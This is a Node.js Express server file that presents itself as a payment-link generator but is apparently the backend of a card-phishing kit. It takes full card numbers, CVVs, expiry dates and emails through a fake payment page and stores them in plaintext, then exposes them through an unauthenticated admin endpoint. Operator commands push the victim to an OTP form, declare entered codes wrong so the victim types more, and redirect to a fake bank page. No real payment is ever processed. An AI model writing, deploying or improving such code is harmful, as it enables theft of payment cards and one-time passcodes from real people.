import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';

const app = express();
app.use(bodyParser.json());
app.use(cors());
app.use(express.static(".")); // serve static files from current folder

// In–memory storage using Maps
const transactions = new Map();
const paymentLinks = new Map();

// =================================================================
// Payment Link Generation Endpoint – REPLACE your entire generatePaymentLink code with this:
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description } = req.body;
    
    // Validate inputs
    if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ 
        status: "error", 
        message: "Invalid amount. Must be a positive number" 
      });
    }
    if (!description || !description.trim()) {
      return res.status(400).json({ 
        status: "error", 
        message: "Description cannot be empty" 
      });
    }
    
    // Generate a secure invoice ID (8 bytes hex uppercase)
    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    
    // Get protocol from header (if behind a proxy) or use req.protocol
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    // Create the payment link directing to landing.html with ?pid=
    const paymentLink = `${protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
    
    // Store payment details in our in–memory map
    paymentLinks.set(invoiceId, {
      amount: parseFloat(amount),
      description: description.trim(),
      paymentLink,
      createdAt: new Date().toISOString()
    });
    
    // Return successful response as JSON
    res.json({ status: "success", paymentLink });
  } catch (error) {
    console.error('Payment Link Error:', error);
    res.status(500).json({ 
      status: "error",
      message: "Internal server error. Please check server logs."
    });
  }
});
// =================================================================

// Endpoint to get payment details (for landing & payment pages)
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Payment details not found" });
  }
  const payment = paymentLinks.get(pid);
  res.json({ status: "success", payment });
});

// Endpoint to get transaction details (for success/fail pages)
app.get('/api/getTransactionDetails', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }
  res.json(txn);
});

// Get all transactions (for admin panel)
app.get('/api/transactions', (req, res) => {
  const txList = Array.from(transactions.values());
  res.json(txList);
});

// Process payment details (from payment page)
app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  
  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount: amount.toString().replace(/,/g, ''),
    currency,
    cardholder,
    status: 'processing',
    otp: null,
    otpShown: false,
    otpEntered: null,
    otpError: false,
    redirectStatus: null,
    bankpageVisible: false,
    timestamp: new Date().toLocaleString()
  };
  
  transactions.set(invoiceId, transaction);
  console.log("New transaction recorded:", transaction);
  res.json({ status: "success", invoiceId });
});

// Show OTP endpoint
app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpShown = true;
  txn.status = 'otp_pending';
  txn.otpError = false;
  res.json({ status: "success", message: "OTP form will be shown to user" });
});

// Mark OTP as wrong endpoint
app.post('/api/wrongOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpError = true;
  txn.status = 'otp_pending';
  res.json({ status: "success", message: "OTP marked as wrong" });
});

// Check transaction status endpoint
app.get('/api/checkTransactionStatus', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }
  if (txn.status === 'otp_pending' && txn.otpShown) {
    return res.json({ status: "show_otp", message: "Show OTP form to user", otpError: txn.otpError });
  }
  if (txn.redirectStatus) {
    let redirectUrl;
    if (txn.redirectStatus === 'success') {
      redirectUrl = `/success.html?invoiceId=${invoiceId}`;
    } else if (txn.redirectStatus === 'fail') {
      redirectUrl = `/fail.html?invoiceId=${invoiceId}`;
    } else if (txn.redirectStatus === 'bankpage') {
      redirectUrl = `/bankpage.html?invoiceId=${invoiceId}`;
    }
    return res.json({ status: "redirect", redirectUrl });
  }
  res.json({ status: txn.status, otpError: txn.otpError });
});

// Submit OTP endpoint
app.post('/api/submitOTP', (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpEntered = otp;
  txn.status = 'otp_received';
  txn.otpError = false;
  console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
  res.json({ status: "success", message: "OTP received" });
});

// Update redirect status endpoint (for admin commands: success, fail, bankpage)
app.post('/api/updateRedirectStatus', (req, res) => {
  const { invoiceId, redirectStatus } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.redirectStatus = redirectStatus;
  console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
  res.json({
    status: "success",
    invoiceId,
    redirectStatus,
    redirectUrl: redirectStatus === 'success'
      ? `/success.html?invoiceId=${invoiceId}`
      : redirectStatus === 'fail'
      ? `/fail.html?invoiceId=${invoiceId}`
      : `/bankpage.html?invoiceId=${invoiceId}`
  });
});

// Redirect to bank page endpoint (admin command)
app.post('/api/redirectToBankPage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.redirectStatus = 'bankpage';
  console.log(`Transaction ${invoiceId} redirected to bank page`);
  res.json({ status: "success", message: "Redirecting to bank page" });
});

// Show bankpage endpoint (admin command)
app.post('/api/showBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });
  
  txn.redirectStatus = 'bankpage';
  txn.bankpageVisible = true;
  res.json({ status: 'success' });
});

// Hide bankpage endpoint (admin command)
app.post('/api/hideBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });
  
  txn.redirectStatus = null;
  txn.bankpageVisible = false;
  res.json({ status: 'success' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
